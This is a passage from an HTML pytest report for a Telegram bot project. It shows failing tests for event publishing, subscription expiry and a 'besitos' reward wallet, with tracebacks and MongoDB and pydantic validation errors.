task: &lt;Task pending name=&#x27;Task-226&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-227&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf360288ed7674ef4ee94f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestHandlerEventIntegration::test_update_received_event_published</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestHandlerEventIntegration object at 0x7d17016bee70&gt;<br/>webhook_handler = &lt;src.handlers.webhook.WebhookHandler object at 0x7d16f8fe39e0&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_update_received_event_published(self, webhook_handler):<br/>        &quot;&quot;&quot;Test that update received events are published when updates are processed.&quot;&quot;&quot;<br/>        # Create mock update<br/>        mock_update = self.create_mock_update()<br/>    <br/>        # Test update processing<br/>        response = await webhook_handler.process_update(mock_update)<br/>    <br/>        # Verify response<br/>        assert response is None<br/>    <br/>        # Verify event was published through the event bus<br/>        method_calls = webhook_handler.event_bus._method_calls<br/>        publish_call_found = any(isinstance(call, tuple) and call[0] == &quot;publish&quot; for call in method_calls)<br/>&gt;       assert publish_call_found, &quot;Expected publish call not found in event bus method calls&quot;<br/><span class="error">E       AssertionError: Expected publish call not found in event bus method calls</span><br/><span class="error">E       assert False</span><br/><br/>tests/integration/test_handlers.py:470: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:271 Failed to publish update_received event: 1 validation error for UpdateReceivedEvent
update_data
  Input should be a valid dictionary [type=dict_type, input_value=&lt;Mock name=&#x27;mock.dict()&#x27; id=&#x27;137537620150992&#x27;&gt;, input_type=Mock]
    For further information visit https://errors.pydantic.dev/2.9/v/dict_type<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestHandlerEventIntegration::test_multiple_handlers_same_event_bus</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestHandlerEventIntegration object at 0x7d17016befc0&gt;<br/>mock_event_bus = &lt;tests.utils.events.MockEventBus object at 0x7d16f8ebcb30&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_multiple_handlers_same_event_bus(self, mock_event_bus):<br/>        &quot;&quot;&quot;Test that multiple handlers can share the same event bus.&quot;&quot;&quot;<br/>        # Create handlers with shared event bus<br/>        command_handler = CommandHandler(event_bus=mock_event_bus)<br/>        webhook_handler = WebhookHandler(event_bus=mock_event_bus)<br/>    <br/>        # Create mock data<br/>        mock_message = self.create_mock_message()<br/>        mock_update = self.create_mock_update()<br/>    <br/>        # Process command and update<br/>        await command_handler.handle_start(mock_message)<br/>        await webhook_handler.process_update(mock_update)<br/>    <br/>        # Verify both handlers used the same event bus<br/>        # Count publish calls<br/>        publish_calls = [call for call in mock_event_bus._method_calls if isinstance(call, tuple) and call[0] == &quot;publish&quot;]<br/>&gt;       assert len(publish_calls) &gt;= 2, &quot;Expected at least 2 publish calls&quot;<br/><span class="error">E       AssertionError: Expected at least 2 publish calls</span><br/><span class="error">E       assert 1 &gt;= 2</span><br/><span class="error">E        +  where 1 = len([(&#x27;publish&#x27;, &#x27;user_interaction&#x27;)])</span><br/><br/>tests/integration/test_handlers.py:490: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:271 Failed to publish update_received event: 1 validation error for UpdateReceivedEvent
update_data
  Input should be a valid dictionary [type=dict_type, input_value=&lt;Mock name=&#x27;mock.dict()&#x27; id=&#x27;137537618959712&#x27;&gt;, input_type=Mock]
    For further information visit https://errors.pydantic.dev/2.9/v/dict_type<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestHandlerDatabaseIntegration::test_command_handler_database_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestHandlerDatabaseIntegration object at 0x7d17016bf230&gt;<br/>command_handler = &lt;src.handlers.commands.CommandHandler object at 0x7d16f8eb2240&gt;<br/>user_service = &lt;coroutine object TestHandlerDatabaseIntegration.user_service at 0x7d16f8f9a020&gt;<br/>mock_database_manager = (&lt;Mock spec=&#x27;DatabaseManager&#x27; id=&#x27;137537618909120&#x27;&gt;, &lt;Mock name=&#x27;mock.get_mongo_db()&#x27; id=&#x27;137537618312032&#x27;&gt;, &lt;Mock name=&#x27;mock.get_sqlite_conn()&#x27; id=&#x27;137537618913488&#x27;&gt;)<br/><br/>    @pytest.mark.asyncio<br/>    async def test_command_handler_database_integration(self, command_handler, user_service, mock_database_manager):<br/>        &quot;&quot;&quot;Test command handler integration with database operations.&quot;&quot;&quot;<br/>        mock_db_manager, mock_mongo_db, mock_sqlite_conn = mock_database_manager<br/>    <br/>        # Create mock message<br/>        mock_message = self.create_mock_message()<br/>    <br/>        # Mock user context<br/>        mock_user_context = {<br/>            &quot;user_id&quot;: &quot;123456789&quot;,<br/>            &quot;telegram_user_id&quot;: 123456789,<br/>            &quot;username&quot;: &quot;testuser&quot;,<br/>            &quot;first_name&quot;: &quot;Test&quot;,<br/>            &quot;last_name&quot;: &quot;User&quot;,<br/>            &quot;language_code&quot;: &quot;en&quot;<br/>        }<br/>    <br/>        # Mock database manager methods<br/>&gt;       with patch.object(command_handler.user_service, &#x27;get_user_context&#x27;,<br/>                         new=AsyncMock(return_value=mock_user_context)), \<br/>             patch.object(command_handler.user_service, &#x27;update_user_profile&#x27;,<br/>                         new=AsyncMock(return_value=True)):<br/><br/>tests/integration/test_handlers.py:576: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/>/usr/lib/python3.12/unittest/mock.py:1458: in __enter__<br/>    original, local = self.get_original()<br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;unittest.mock._patch object at 0x7d16f8eb3ec0&gt;<br/><br/>    def get_original(self):<br/>        target = self.getter()<br/>        name = self.attribute<br/>    <br/>        original = DEFAULT<br/>        local = False<br/>    <br/>        try:<br/>            original = target.__dict__[name]<br/>        except (AttributeError, KeyError):<br/>            original = getattr(target, name, DEFAULT)<br/>        else:<br/>            local = True<br/>    <br/>        if name in _builtins and isinstance(target, ModuleType):<br/>            self.create = True<br/>    <br/>        if not self.create and original is DEFAULT:<br/>&gt;           raise AttributeError(<br/>                &quot;%s does not have the attribute %r&quot; % (target, name)<br/>            )<br/><span class="error">E           AttributeError: &lt;coroutine object TestHandlerDatabaseIntegration.user_service at 0x7d16f8f9a020&gt; does not have the attribute &#x27;get_user_context&#x27;</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:1431: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestHandlerDatabaseIntegration::test_command_handler_database_error_handling</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestHandlerDatabaseIntegration object at 0x7d17016bf3b0&gt;<br/>command_handler = &lt;src.handlers.commands.CommandHandler object at 0x7d16f8eb3080&gt;<br/>user_service = &lt;coroutine object TestHandlerDatabaseIntegration.user_service at 0x7d16f8f99580&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_command_handler_database_error_handling(self, command_handler, user_service):<br/>        &quot;&quot;&quot;Test command handler error handling for database failures.&quot;&quot;&quot;<br/>        # Create mock message<br/>        mock_message = self.create_mock_message()<br/>    <br/>        # Mock database manager to raise exception<br/>&gt;       with patch.object(command_handler.user_service, &#x27;get_user_context&#x27;,<br/>                         new=AsyncMock(side_effect=Exception(&quot;Database error&quot;))), \<br/>             patch.object(command_handler.user_service, &#x27;create_user&#x27;,<br/>                         new=AsyncMock(side_effect=Exception(&quot;Database error&quot;))):<br/><br/>tests/integration/test_handlers.py:599: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/>/usr/lib/python3.12/unittest/mock.py:1458: in __enter__<br/>    original, local = self.get_original()<br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;unittest.mock._patch object at 0x7d16f8f7ce00&gt;<br/><br/>    def get_original(self):<br/>        target = self.getter()<br/>        name = self.attribute<br/>    <br/>        original = DEFAULT<br/>        local = False<br/>    <br/>        try:<br/>            original = target.__dict__[name]<br/>        except (AttributeError, KeyError):<br/>            original = getattr(target, name, DEFAULT)<br/>        else:<br/>            local = True<br/>    <br/>        if name in _builtins and isinstance(target, ModuleType):<br/>            self.create = True<br/>    <br/>        if not self.create and original is DEFAULT:<br/>&gt;           raise AttributeError(<br/>                &quot;%s does not have the attribute %r&quot; % (target, name)<br/>            )<br/><span class="error">E           AttributeError: &lt;coroutine object TestHandlerDatabaseIntegration.user_service at 0x7d16f8f99580&gt; does not have the attribute &#x27;get_user_context&#x27;</span><br/><br/>/usr/lib/python3.12/unittest/mock.py:1431: AttributeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestEndToEndHandlerIntegration::test_complete_webhook_flow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestEndToEndHandlerIntegration object at 0x7d17016bec60&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_complete_webhook_flow(self):<br/>        &quot;&quot;&quot;Test complete webhook flow from update to event publishing.&quot;&quot;&quot;<br/>        # Create handler with mock event bus<br/>        mock_event_bus = MockEventBus()<br/>        webhook_handler = WebhookHandler(event_bus=mock_event_bus)<br/>    <br/>        # Create mock update<br/>        mock_update = self.create_mock_update()<br/>    <br/>        # Test complete flow<br/>        response = await webhook_handler.process_update(mock_update)<br/>    <br/>        # Verify response<br/>        assert response is None  # Current implementation returns None<br/>    <br/>        # Verify event was published<br/>        method_calls = mock_event_bus._method_calls<br/>        publish_call_found = any(isinstance(call, tuple) and call[0] == &quot;publish&quot; for call in method_calls)<br/>&gt;       assert publish_call_found<br/><span class="error">E       assert False</span><br/><br/>tests/integration/test_handlers.py:717: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:271 Failed to publish update_received event: 1 validation error for UpdateReceivedEvent
update_data
  Input should be a valid dictionary [type=dict_type, input_value=&lt;Mock name=&#x27;mock.dict()&#x27; id=&#x27;137537618959616&#x27;&gt;, input_type=Mock]
    For further information visit https://errors.pydantic.dev/2.9/v/dict_type<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_handlers.py::TestEndToEndHandlerIntegration::test_handler_event_separation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_handlers.TestEndToEndHandlerIntegration object at 0x7d17016be660&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_handler_event_separation(self):<br/>        &quot;&quot;&quot;Test that command and webhook handlers publish different events.&quot;&quot;&quot;<br/>        # Create handlers with shared event bus<br/>        mock_event_bus = MockEventBus()<br/>        command_handler = CommandHandler(event_bus=mock_event_bus)<br/>        webhook_handler = WebhookHandler(event_bus=mock_event_bus)<br/>    <br/>        # Create mock data<br/>        mock_message = self.create_mock_message(text=&quot;/start&quot;)<br/>        mock_update = self.create_mock_update()<br/>    <br/>        # Process both handlers<br/>        await command_handler.handle_start(mock_message)<br/>        await webhook_handler.process_update(mock_update)<br/>    <br/>        # Verify events were published<br/>        method_calls = mock_event_bus._method_calls<br/>        publish_calls = [call for call in method_calls if isinstance(call, tuple) and call[0] == &quot;publish&quot;]<br/>&gt;       assert len(publish_calls) &gt;= 2, &quot;Expected at least 2 publish calls for different handlers&quot;<br/><span class="error">E       AssertionError: Expected at least 2 publish calls for different handlers</span><br/><span class="error">E       assert 1 &gt;= 2</span><br/><span class="error">E        +  where 1 = len([(&#x27;publish&#x27;, &#x27;user_interaction&#x27;)])</span><br/><br/>tests/integration/test_handlers.py:738: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:271 Failed to publish update_received event: 1 validation error for UpdateReceivedEvent
update_data
  Input should be a valid dictionary [type=dict_type, input_value=&lt;Mock name=&#x27;mock.dict()&#x27; id=&#x27;137537618917904&#x27;&gt;, input_type=Mock]
    For further information visit https://errors.pydantic.dev/2.9/v/dict_type<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_process_expiration_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_subscription_workflow.TestSubscriptionWorkflow object at 0x7d17016d8560&gt;<br/>subscription_manager = &lt;src.modules.admin.subscription_manager.SubscriptionManager object at 0x7d16f8f41010&gt;<br/>mock_db = (&lt;Mock id=&#x27;137537620198368&#x27;&gt;, &lt;Mock name=&#x27;mock.__getitem__()&#x27; id=&#x27;137537620198848&#x27;&gt;)<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537620199136&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_process_expiration_success(self, subscription_manager, mock_db, mock_event_bus):<br/>        &quot;&quot;&quot;Test successful processing of expired subscriptions.<br/>    <br/>        Implements requirement 3.2: WHEN subscriptions expire THEN the system SHALL<br/>        run cron jobs and publish subscription_expired events<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        mock_db_instance, mock_subscriptions = mock_db<br/>        now = datetime.utcnow()<br/>    <br/>        # Mock expired subscriptions<br/>        expired_sub_1 = {<br/>            &quot;_id&quot;: &quot;subscription_1&quot;,<br/>            &quot;user_id&quot;: &quot;user_123&quot;,<br/>            &quot;plan_type&quot;: &quot;premium&quot;,<br/>            &quot;start_date&quot;: now - timedelta(days=40),<br/>            &quot;end_date&quot;: now - timedelta(days=10),<br/>            &quot;status&quot;: &quot;active&quot;<br/>        }<br/>        expired_sub_2 = {<br/>            &quot;_id&quot;: &quot;subscription_2&quot;,<br/>            &quot;user_id&quot;: &quot;user_456&quot;,<br/>            &quot;plan_type&quot;: &quot;vip&quot;,<br/>            &quot;start_date&quot;: now - timedelta(days=35),<br/>            &quot;end_date&quot;: now - timedelta(days=5),<br/>            &quot;status&quot;: &quot;active&quot;<br/>        }<br/>    <br/>        # Mock async cursor for find operation<br/>        mock_cursor = AsyncMock()<br/>        mock_cursor.__aiter__ = Mock(return_value=iter([expired_sub_1, expired_sub_2]))<br/>        mock_subscriptions.find.return_value = mock_cursor<br/>        mock_subscriptions.update_one = AsyncMock()<br/>    <br/>        # Act<br/>&gt;       expired_subscriptions = await subscription_manager.process_expiration()<br/><br/>tests/integration/test_subscription_workflow.py:199: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.admin.subscription_manager.SubscriptionManager object at 0x7d16f8f41010&gt;<br/><br/>    async def process_expiration(self) -&gt; List[ExpiredSubscription]:<br/>        &quot;&quot;&quot;Processes expired subscriptions and updates their status.&quot;&quot;&quot;<br/>        now = datetime.utcnow()<br/>        expired_subs = []<br/>        cursor = self.subscriptions.find({<br/>            &quot;status&quot;: &quot;active&quot;,<br/>            &quot;end_date&quot;: {&quot;$lt&quot;: now}<br/>        })<br/>&gt;       async for sub in cursor:<br/><span class="error">E       TypeError: &#x27;async for&#x27; received an object from __aiter__ that does not implement __anext__: list_iterator</span><br/><br/>src/modules/admin/subscription_manager.py:95: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_subscription_workflow.py::TestSubscriptionWorkflow::test_subscription_workflow_integration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_subscription_workflow.TestSubscriptionWorkflow object at 0x7d17016d86e0&gt;<br/>subscription_manager = &lt;src.modules.admin.subscription_manager.SubscriptionManager object at 0x7d17000e3a70&gt;<br/>mock_db = (&lt;Mock id=&#x27;137537738643056&#x27;&gt;, &lt;Mock name=&#x27;mock.__getitem__()&#x27; id=&#x27;137537618836656&#x27;&gt;)<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537738648240&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_subscription_workflow_integration(self, subscription_manager, mock_db, mock_event_bus):<br/>        &quot;&quot;&quot;Test complete subscription workflow integration.<br/>    <br/>        Implements requirement 4.5: WHEN cross-module workflows execute THEN events<br/>        SHALL be processed in chronological order using correlation IDs<br/>        &quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;workflow_test_user&quot;<br/>        plan_type = &quot;vip&quot;<br/>        duration_days = 15<br/>        mock_db_instance, mock_subscriptions = mock_db<br/>    <br/>        # Mock the insert result for subscription creation<br/>        mock_result = Mock()<br/>        mock_result.inserted_id = &quot;workflow_subscription_789&quot;<br/>        mock_subscriptions.insert_one = AsyncMock(return_value=mock_result)<br/>    <br/>        # Mock find_one for checking status<br/>        mock_subscriptions.find_one = AsyncMock(return_value=None)<br/>    <br/>        # Act - Step 1: Create subscription<br/>        subscription = await subscription_manager.create_subscription(user_id, plan_type, duration_days)<br/>    <br/>        # Act - Step 2: Check VIP status<br/>        vip_status = await subscription_manager.check_vip_status(user_id)<br/>    <br/>        # Act - Step 3: Process expiration (no expired subscriptions in this case)<br/>&gt;       expired_subscriptions = await subscription_manager.process_expiration()<br/><br/>tests/integration/test_subscription_workflow.py:247: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.admin.subscription_manager.SubscriptionManager object at 0x7d17000e3a70&gt;<br/><br/>    async def process_expiration(self) -&gt; List[ExpiredSubscription]:<br/>        &quot;&quot;&quot;Processes expired subscriptions and updates their status.&quot;&quot;&quot;<br/>        now = datetime.utcnow()<br/>        expired_subs = []<br/>        cursor = self.subscriptions.find({<br/>            &quot;status&quot;: &quot;active&quot;,<br/>            &quot;end_date&quot;: {&quot;$lt&quot;: now}<br/>        })<br/>&gt;       async for sub in cursor:<br/><span class="error">E       TypeError: &#x27;async for&#x27; requires an object with __aiter__ method, got Mock</span><br/><br/>src/modules/admin/subscription_manager.py:95: TypeError<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/integration/test_workflows.py::TestEndToEndWorkflows::test_reaction_to_content_workflow</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;tests.integration.test_workflows.TestEndToEndWorkflows object at 0x7d170169eb70&gt;<br/>coordinator_service = &lt;src.services.coordinator.CoordinatorService object at 0x7d16f8e77d40&gt;<br/>mock_event_bus = &lt;tests.utils.events.MockEventBus object at 0x7d16f8e74320&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_reaction_to_content_workflow(self, coordinator_service, mock_event_bus):<br/>        &quot;&quot;&quot;Test user reaction to content workflow.&quot;&quot;&quot;<br/>        # Prepare test data<br/>        user_id = &quot;test_user_123&quot;<br/>        content_id = &quot;content_001&quot;<br/>        reaction_type = &quot;like&quot;<br/>    <br/>        # Execute workflow<br/>        success = await coordinator_service.handle_reaction(user_id, content_id, reaction_type)<br/>    <br/>        # Verify workflow completion<br/>        assert success is True<br/>    <br/>        # Verify event publishing<br/>        published_events = mock_event_bus.published_events<br/>&gt;       assert len(published_events) == 2  # reaction_detected + besitos_awarded<br/><span class="error">E       AssertionError: assert 1 == 2</span><br/><span class="error">E        +  where 1 = len([{&#x27;event_name&#x27;: &#x27;reaction_detected&#x27;, &#x27;payload&#x27;: {&#x27;content_id&#x27;: &#x27;content_001&#x27;, &#x27;correlation_id&#x27;: &#x27;f0982d7c-a40e-48ee-96...05e4cab323&#x27;, &#x27;event_type&#x27;: &#x27;reaction_detected&#x27;, ...}, &#x27;timestamp&#x27;: datetime.datetime(2025, 9, 20, 23, 17, 28, 756308)}])</span><br/><br/>tests/integration/test_workflows.py:145: AssertionError<br/> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.coordinator:coordinator.py:153 Error processing besitos transaction: 3 validation errors for BesitosAwardedEvent
source
  Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;test_user_12...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.9/v/missing
balance_after
  Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;test_user_12...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.9/v/missing
transaction_id
  Field required [type=missing, input_value={&#x27;user_id&#x27;: &#x27;test_user_12...ype&#x27;: &#x27;besitos_awarded&#x27;}, input_type=dict]
    For further information visit https://errors.pydantic.dev/2.9/v/missing<br/></div></td></tr></tbody>
      <tbody class="failed results-table-row">
        <tr>
          <td class="col-result">Failed</td>
          <td class="col-name">tests/modules/gamification/test_besitos_wallet.py::TestBesitosWallet::test_add_besitos_success</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log">self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8b86720&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Test reward&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>&gt;                   user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    )<br/><span class="error">E                   TypeError: object dict can&#x27;t be used in &#x27;await&#x27; expression</span><br/><br/>src/modules/gamification/besitos_wallet.py:113: TypeError<br/><br/>During handling of the above exception, another exception occurred:<br/><br/>self = &lt;test_besitos_wallet.TestBesitosWallet object at 0x7d17016f4e90&gt;<br/>besitos_wallet = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8b86720&gt;<br/>mock_mongodb_handler = &lt;Mock spec=&#x27;MongoDBHandler&#x27; id=&#x27;137537616795152&#x27;&gt;<br/>mock_event_bus = &lt;Mock spec=&#x27;EventBus&#x27; id=&#x27;137537615588736&#x27;&gt;<br/>mock_session = &lt;Mock name=&#x27;mock._db.client.start_session().__aenter__()&#x27; id=&#x27;137537615587536&#x27;&gt;<br/><br/>    @pytest.mark.asyncio<br/>    async def test_add_besitos_success(self, besitos_wallet, mock_mongodb_handler, mock_event_bus, mock_session):<br/>        &quot;&quot;&quot;Test successful addition of besitos to user wallet.&quot;&quot;&quot;<br/>        # Arrange<br/>        user_id = &quot;test_user_123&quot;<br/>        amount = 100<br/>        reason = &quot;Test reward&quot;<br/>        mock_users_collection = mock_mongodb_handler.get_users_collection.return_value<br/>        mock_transactions_collection = mock_mongodb_handler.get_besitos_transactions_collection.return_value<br/>    <br/>        # Mock user document with existing balance<br/>        mock_users_collection.find_one.return_value = {&quot;besitos_balance&quot;: 50}<br/>    <br/>        # Mock session context manager<br/>        mock_mongodb_handler._db.client.start_session.return_value.__aenter__.return_value = mock_session<br/>        mock_session.__aenter__ = AsyncMock(return_value=mock_session)<br/>    <br/>        # Act<br/>&gt;       result = await besitos_wallet.add_besitos(user_id, amount, reason)<br/><br/>tests/modules/gamification/test_besitos_wallet.py:81: <br/>_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ <br/><br/>self = &lt;src.modules.gamification.besitos_wallet.BesitosWallet object at 0x7d16f8b86720&gt;<br/>user_id = &#x27;test_user_123&#x27;, amount = 100, reason = &#x27;Test reward&#x27;<br/>source = &#x27;system&#x27;, reference_id = None, metadata = {}<br/><br/>    async def add_besitos(self, user_id: str, amount: int, reason: str,<br/>                         source: str = &quot;system&quot;, reference_id: Optional[str] = None,<br/>                         metadata: Optional[Dict[str, Any]] = None) -&gt; Transaction:<br/>        &quot;&quot;&quot;Add besitos to user&#x27;s wallet with atomic transaction.<br/>    <br/>        Implements requirement 2.1: WHEN besitos are awarded THEN the system<br/>        SHALL perform atomic transactions in the database and publish besitos_added events.<br/>    <br/>        Args:<br/>            user_id: User ID to add besitos to<br/>            amount: Amount of besitos to add (must be positive)<br/>            reason: Reason for adding besitos<br/>            source: Source of the besitos (default: &quot;system&quot;)<br/>            reference_id: Optional reference to related entity<br/>            metadata: Optional additional metadata<br/>    <br/>        Returns:<br/>            Transaction: Transaction object with details<br/>    <br/>        Raises:<br/>            BesitosWalletError: If transaction fails<br/>            ValueError: If amount is not positive<br/>        &quot;&quot;&quot;<br/>        if amount &lt;= 0:<br/>            raise ValueError(&quot;Amount must be positive&quot;)<br/>    <br/>        logger.info(&quot;Adding %d besitos to user %s for reason: %s&quot;, amount, user_id, reason)<br/>    <br/>        transaction_id = str(uuid.uuid4())<br/>        metadata = metadata or {}<br/>    <br/>        # Start MongoDB transaction for atomicity (requirement 6.5)<br/>        async with await self.mongodb_handler._db.client.start_session() as session:<br/>            try:<br/>                async with session.start_transaction():<br/>                    # Get current user balance<br/>                    user_doc = await self.users_collection.find_one(<br/>                        {&quot;user_id&quot;: user_id},<br/>                        {&quot;besitos_balance&quot;: 1},<br/>                        session=session<br/>                    